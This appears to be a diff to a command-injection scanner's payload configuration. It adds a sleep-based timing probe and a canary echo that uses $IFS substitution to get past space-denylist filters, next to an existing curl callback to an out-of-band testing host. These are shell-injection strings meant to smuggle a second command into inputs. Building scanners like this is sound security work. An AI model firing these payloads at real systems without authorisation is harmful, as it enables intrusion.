@@ -40,6 +40,14 @@ payloads:
     template: '; curl -sSf http://{oast_host}/{canary} >/dev/null'
     confidence: confirmed
     notes: HTTP-canary OAST probe; only used when DNS variant fails.
+  - id: sleep_timing_canary
+    template: '; sleep 9'
+    confidence: likely
+    notes: Time-based blind confirmation; a stable multi-second delay vs. baseline proves execution without needing reflected output.
+  - id: ifs_bypass_echo
+    template: ';echo${IFS}{canary}'
+    confidence: suspected
+    notes: $IFS substitution bypasses space-character denylist filters; echoes the {canary} marker for differential confirmation.
 mutations:
   - name: whitespace_alt
     description: Alternative whitespace defeats simple space-banning filters.
